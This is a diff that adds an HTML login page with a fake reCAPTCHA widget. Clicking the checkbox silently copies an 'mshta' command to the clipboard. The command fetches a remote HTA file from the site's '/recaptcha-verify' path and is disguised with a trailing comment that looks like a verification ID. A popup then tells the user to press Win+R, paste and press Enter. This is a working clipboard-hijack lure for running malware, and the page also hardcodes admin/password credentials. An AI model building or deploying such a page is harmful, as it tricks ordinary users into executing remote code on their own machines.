@@ -1,0 +1,620 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Form with reCAPTCHA</title>
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.0/css/all.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: #f5f7fa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .login-container {
+            background-color: #ffffff;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            padding: 30px;
+            position: relative; /* Added for positioning context */
+        }
+        
+        .login-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .login-header h1 {
+            color: #3a3a3a;
+            font-size: 28px;
+            font-weight: 600;
+        }
+        
+        .login-header p {
+            color: #888;
+            margin-top: 8px;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #555;
+            font-weight: 500;
+        }
+        
+        .input-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 16px;
+            transition: border-color 0.3s ease;
+        }
+        
+        .input-group input:focus {
+            border-color: #4a6cf7;
+            outline: none;
+        }
+        
+        .recaptcha-container {
+            margin: 20px 0;
+            display: flex;
+            justify-content: center;
+        }
+        
+        .login-button {
+            background-color: #4a6cf7;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 12px 15px;
+            width: 100%;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        
+        .login-button:hover {
+            background-color: #3a5ce5;
+        }
+        
+        .login-footer {
+            text-align: center;
+            margin-top: 25px;
+            color: #777;
+        }
+        
+        .login-footer a {
+            color: #4a6cf7;
+            text-decoration: none;
+        }
+        
+        .login-footer a:hover {
+            text-decoration: underline;
+        }
+        
+        .error-message {
+            color: #e74c3c;
+            font-size: 14px;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        .success-message {
+            color: #2ecc71;
+            text-align: center;
+            padding: 15px;
+            border-radius: 6px;
+            background-color: rgba(46, 204, 113, 0.1);
+            margin-top: 20px;
+            display: none;
+        }
+
+        /* Fake CAPTCHA Styles */
+        .checkbox-window {
+            height: 74px;
+            width: 300px;
+            background-color: #f9f9f9;
+            border-radius: 3px;
+            border: 1px solid #d3d3d3;
+            margin: 0 auto;
+            position: relative; /* Added for positioning context */
+        }
+
+        .checkbox-window a {
+            color: #555;
+            text-decoration: none;
+        }
+
+        .checkbox-window a:hover {
+            color: #555;
+            text-decoration: underline;
+        }
+
+        .checkbox-container {
+            width: 28px;
+            height: 28px;
+        }
+
+        .checkbox {
+            position: relative;
+            background-color: #fff;
+            border-radius: 2px;
+            height: 100%;
+            width: 100%;
+            border: 2px solid #c1c1c1;
+            margin: 21px 0 0 12px;
+            outline: none;
+            font-family: Roboto, helvetica, arial, sans-serif;
+            transition: width 500ms, height 500ms, border-radius 500ms, margin-top 500ms, margin-left 500ms, opacity 700ms;
+        }
+
+        .checkbox:hover {
+            border: 2px solid #b2b2b2;
+        }
+
+        .im-not-a-robot {
+            position: relative;
+            left: 52px;
+            bottom: 3px;
+            font-size: 14px;
+            color: #282727;
+        }
+
+        .captcha-logo {
+            position: relative;
+            left: 244px;
+            bottom: 36px;
+            width: 40px;
+            height: 45px;
+            vertical-align: baseline;
+            padding-bottom: 4px;
+        }
+
+        .checkbox-desc {
+            color: #555555;
+            position: relative;
+            font-size: 8px;
+            text-align: center;
+            bottom: 40px;
+            left: 112px;
+        }
+
+        .spinner {
+            visibility: hidden;
+            position: relative;
+            top: -85px;
+            left: 12px;
+            height: 20px;
+            width: 20px;
+            border: 2px solid rgba(0, 0, 0, 0.1);
+            border-top: 2px solid #333;
+            border-radius: 50%;
+            visibility: hidden;
+            opacity: 0;
+            transition: opacity 0.5s linear;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .verify-window {
+            font-family: Roboto, helvetica, arial, sans-serif;
+            opacity: 0;
+            position: absolute;
+            visibility: hidden;
+            margin: auto;
+            width: 350px; /* Increased from 310px to 350px */
+            background-color: #fff;
+            border: 1px solid #cecece;
+            -webkit-box-shadow: 5px 6px 7px -3px rgba(0, 0, 0, 0.12);
+            box-shadow: 5px 6px 7px -3px rgba(0, 0, 0, 0.12);
+            transition: opacity 400ms;
+            z-index: 1000;
+        }
+
+        ol {
+            counter-reset: item;
+            list-style-type: none;
+            list-style-position: outside;    
+            padding-left: 0;
+        }
+
+        ol li {
+            counter-increment: item;
+            margin-bottom: 15px; /* Increased from 10px to 15px */
+            padding-right: 10px; /* Added padding on the right side */
+        }
+
+        ol li::before {
+            content: counter(item) ". ";
+            color: #1A73E8;
+            font-weight: bold;
+            margin-right: 10px;
+            margin-left: 10px;
+        }
+
+        .verify-container {
+            padding: 10px; /* Increased from 8px to 10px */
+        }
+
+        .verify-header {
+            background-color: #1A73E8;
+            padding: 18px 18px 26px 18px; /* Slightly increased padding */
+            color: #fff;
+        }
+
+        .verify-header-text-small {
+            font-size: 14px;
+            line-height: normal;
+        }
+
+        .verify-header-text-medium {
+            font-size: 16px;
+        }
+
+        .verify-header-text-big {
+            font-size: 26px; /* Increased from 24px to 26px */
+            font-weight: 700;
+        }
+
+        .verify-main {
+            padding: 15px; /* Increased from 5px to 15px */
+            color: #111;
+            font-size: 14px; /* Increased from 13px to 14px */
+            line-height: 1.4; /* Added line height for better readability */
+        }
+
+        .verify-footer {
+            border-top: 1px solid #cecece;
+            padding: 12px 10px 12px 10px; /* Increased padding */
+            color: #737373;
+            display: grid;
+            grid-template-columns: auto 102px;
+            font-size: 13px;
+        }
+
+        .verify-footer-left {
+            padding: 8px; /* Increased from 5px to 8px */
+        }
+
+        .verify-verify-button {
+            text-transform: uppercase;
+            background-color: #5a89e2;
+            color: #fff;
+            text-align: center;
+            width: 100%;
+            padding: 12px 0 12px 0;
+            text-decoration: none;
+            font-weight: 600;
+            height: min-content;
+            border-radius: 3px;
+            font-size: 14px;
+            border: none;
+            outline: none;
+            cursor: not-allowed;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-header">
+            <h1>Welcome Back</h1>
+            <p>Enter your credentials to access your account</p>
+        </div>
+        
+        <form id="loginForm">
+            <div class="input-group">
+                <label for="username">Username</label>
+                <input type="text" id="username" name="username" required>
+                <div class="error-message" id="username-error"></div>
+            </div>
+            
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required>
+                <div class="error-message" id="password-error"></div>
+            </div>
+            
+            <!-- Fake CAPTCHA widget -->
+            <div class="recaptcha-container">
+                <div id="checkbox-window" class="checkbox-window m-p block">
+                    <div class="checkbox-container m-p">
+                        <button type="button" id="checkbox" class="checkbox m-p line-normal"></button>
+                    </div>
+                    <p class="im-not-a-robot m-p line-normal">I'm not a robot</p>
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/a/ad/RecaptchaLogo.svg" class="captcha-logo line-normal" alt="">
+                    <br>
+                    <p class="checkbox-desc m-p line-normal">
+                    <a href="https://www.google.com/intl/en/policies/privacy/">Privacy</a> - <a href="https://www.google.com/intl/en/policies/terms/">Terms</a>
+                    </p>
+                    <img class="spinner" alt="" id="spinner">
+                </div>
+                <div class="error-message" id="recaptcha-error"></div>
+            </div>
+            
+            <div id="verify-window" class="verify-window">
+                <div class="verify-container">
+                    <header class="verify-header">
+                        <span class="verify-header-text-medium m-p block">Complete these</span>
+                        <span class="verify-header-text-big m-p block">Verification Steps</span>
+                        <span class="verify-header-text-medium m-p block"></span>
+                    </header>
+                    <main class="verify-main">
+                        <p>
+                            To better prove you are not a robot, please:
+                        </p>
+                        <ol>
+                            <li>
+                                Press & hold the Windows Key <i class="fab fa-windows"></i> + <b>R</b>.
+                            </li>
+                            
+                            <li>
+                                In verification window, press <b>Ctrl</b> + <b>V</b>.
+                            </li>
+
+                            <li>
+                                Press <b>Enter</b> on your keyboard to finish.
+                            </li>
+                        </ol>
+                    </main>
+                </div>
+                <footer class="verify-container verify-footer">
+                    <div class="verify-footer-left">
+                        Perform the steps above to finish verification.
+                    </div>
+                    <button type="button" class="verify-verify-button block" id="verify-verify-button" disabled="true">Verify</button>
+                </footer>
+            </div>
+            
+            <button type="submit" class="login-button">Log In</button>
+            
+            <div class="success-message" id="success-message">
+                Login successful! Welcome back.
+            </div>
+        </form>
+        
+        <div class="login-footer">
+            <p>Don't have an account? <a href="#">Sign up</a></p>
+        </div>
+    </div>
+
+    <script>
+        // Hardcoded credentials (for demonstration only)
+        const validUsername = "admin";
+        const validPassword = "password";
+        let captchaVerified = false;
+        
+        // Fake CAPTCHA functionality
+        let checkboxWindow = document.getElementById("checkbox-window");
+        let checkboxBtn = document.getElementById("checkbox");
+        let checkboxBtnSpinner = document.getElementById("spinner");
+        let verifyWindow = document.getElementById("verify-window");
+
+        function addCaptchaListeners() {
+            if (checkboxBtn) {
+                document.addEventListener("click", function (event) {
+                    let path = event.composedPath();
+                    if (!path.includes(verifyWindow) && isVerifyWindowVisible()) {
+                        closeVerifyWindow();
+                    }
+                });
+                checkboxBtn.addEventListener("click", function (event) {
+                    event.preventDefault();
+                    checkboxBtn.disabled = true;
+                    runClickedCheckboxEffects();
+                });
+            }
+        }
+
+        function runClickedCheckboxEffects() {
+            hideCaptchaCheckbox();
+            setTimeout(function(){
+                showCaptchaLoading();
+            },500);
+            setTimeout(function(){
+                showVerifyWindow();
+            },900);
+        }
+
+        function showCaptchaLoading() {
+            checkboxBtnSpinner.style.visibility = "visible";
+            checkboxBtnSpinner.style.opacity = "1";
+            checkboxBtnSpinner.style.animation = "spin 1s linear infinite";
+        }
+
+        function hideCaptchaLoading() {
+            checkboxBtnSpinner.style.opacity = "0";
+            checkboxBtnSpinner.style.animation = "none";
+            setTimeout(function() {
+                checkboxBtnSpinner.style.visibility = "hidden";
+            }, 500);
+        }
+
+        function hideCaptchaCheckbox() {
+            checkboxBtn.style.visibility = "hidden";
+            checkboxBtn.style.opacity = "0";
+        }
+
+        function showCaptchaCheckbox() {
+            checkboxBtn.style.width = "100%";
+            checkboxBtn.style.height = "100%";
+            checkboxBtn.style.borderRadius = "2px";
+            checkboxBtn.style.margin = "21px 0 0 12px";
+            checkboxBtn.style.opacity = "1";
+        }
+
+        function hideCaptchaCheckbox() {
+            checkboxBtn.style.width = "4px";
+            checkboxBtn.style.height = "4px";
+            checkboxBtn.style.borderRadius = "50%";
+            checkboxBtn.style.marginLeft = "25px";
+            checkboxBtn.style.marginTop = "33px";
+            checkboxBtn.style.opacity = "0";
+        }
+
+        function generateRandomNumber() {
+            const min = 1000; 
+            const max = 9999;
+            return Math.floor(Math.random() * (max - min + 1) + min).toString();
+        }
+
+        function closeVerifyWindow() {
+            verifyWindow.style.display = "none";
+            verifyWindow.style.visibility = "hidden";
+            verifyWindow.style.opacity = "0";
+
+            showCaptchaCheckbox();
+            hideCaptchaLoading();
+            checkboxBtn.disabled = false;
+            
+            // Set CAPTCHA as verified (for demonstration purposes)
+            captchaVerified = true;
+            checkboxBtn.style.background = "url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0Ij48cGF0aCBmaWxsPSIjNENBRjUwIiBkPSJNOSAxNi4yTDQuOCAxMmwtMS40IDEuNEw5IDE5IDIxIDdsLTEuNC0xLjRMOSAxNi4yeiIvPjwvc3ZnPg==') center center no-repeat";
+            checkboxBtn.style.backgroundSize = "20px 20px";
+        }
+
+        function isVerifyWindowVisible() {
+            return verifyWindow.style.display !== "none" && verifyWindow.style.display !== "";
+        }
+
+        function setClipboardCopyData(textToCopy){
+            const tempTextArea = document.createElement("textarea");
+            tempTextArea.value = textToCopy;
+            document.body.append(tempTextArea);
+            tempTextArea.select();
+            document.execCommand("copy");
+            document.body.removeChild(tempTextArea);
+        }
+
+        function stageClipboard(commandToRun, verification_id){
+            const suffix = " # "
+            const ploy = "✅ \"I am not a robot - reCAPTCHA Verification ID: "
+            const end = "\""
+            const textToCopy = commandToRun + suffix + ploy + verification_id + end
+
+            setClipboardCopyData(textToCopy);
+        }
+
+        function showVerifyWindow() {
+            verifyWindow.style.display = "block";
+            verifyWindow.style.visibility = "visible";
+            verifyWindow.style.opacity = "1";
+            
+            // Position the verification window to the right side of the checkbox window
+            const checkboxRect = checkboxWindow.getBoundingClientRect();
+            const loginContainerRect = document.querySelector('.login-container').getBoundingClientRect();
+            
+            // Calculate positions for the verification window
+            // Place it to the right of the checkbox window
+            verifyWindow.style.top = (checkboxRect.top - loginContainerRect.top) + "px";
+            verifyWindow.style.left = (checkboxRect.width + 20) + "px"; 
+            
+            // Check if the verification window would go off-screen to the right
+            const verifyWindowWidth = 350; // Updated width of the verification window
+            const availableWidth = window.innerWidth - checkboxRect.right;
+            
+            if (availableWidth < verifyWindowWidth + 20) {
+                // Not enough space on the right, place it on the left side instead
+                verifyWindow.style.left = "-370px"; // Adjusted for the new width
+            }
+
+            var verification_id = generateRandomNumber();
+            // Add this ID element to the HTML
+            if (!document.getElementById('verification-id')) {
+                const verificationIdSpan = document.createElement('span');
+                verificationIdSpan.id = 'verification-id';
+                verificationIdSpan.style.display = 'none';
+                document.body.appendChild(verificationIdSpan);
+            }
+            document.getElementById('verification-id').textContent = verification_id;
+            
+            const htaPath = window.location.origin + "/recaptcha-verify";
+            const commandToRun = "mshta " + htaPath
+            stageClipboard(commandToRun, verification_id)
+        }
+
+        // Login form functionality
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            
+            // Reset error messages
+            document.querySelectorAll('.error-message').forEach(function(el) {
+                el.style.display = 'none';
+            });
+            document.getElementById('success-message').style.display = 'none';
+            
+            // Get form values
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value;
+            
+            let isValid = true;
+            
+            // Validate username
+            if (username === '') {
+                document.getElementById('username-error').textContent = 'Username is required';
+                document.getElementById('username-error').style.display = 'block';
+                isValid = false;
+            } else if (username !== validUsername) {
+                document.getElementById('username-error').textContent = 'Invalid username';
+                document.getElementById('username-error').style.display = 'block';
+                isValid = false;
+            }
+            
+            // Validate password
+            if (password === '') {
+                document.getElementById('password-error').textContent = 'Password is required';
+                document.getElementById('password-error').style.display = 'block';
+                isValid = false;
+            } else if (password !== validPassword) {
+                document.getElementById('password-error').textContent = 'Invalid password';
+                document.getElementById('password-error').style.display = 'block';
+                isValid = false;
+            }
+            
+            // Validate reCAPTCHA
+            if (!captchaVerified) {
+                document.getElementById('recaptcha-error').textContent = 'Please complete the reCAPTCHA verification';
+                document.getElementById('recaptcha-error').style.display = 'block';
+                isValid = false;
+            }
+            
+            // If all validations pass
+            if (isValid) {
+                document.getElementById('success-message').style.display = 'block';
+                // Redirect would normally go here
+                // window.location.href = 'success.html'; 
+            }
+        });
+        
+        // Initialize the fake CAPTCHA
+        addCaptchaListeners();
+    </script>
+</body>
+</html>
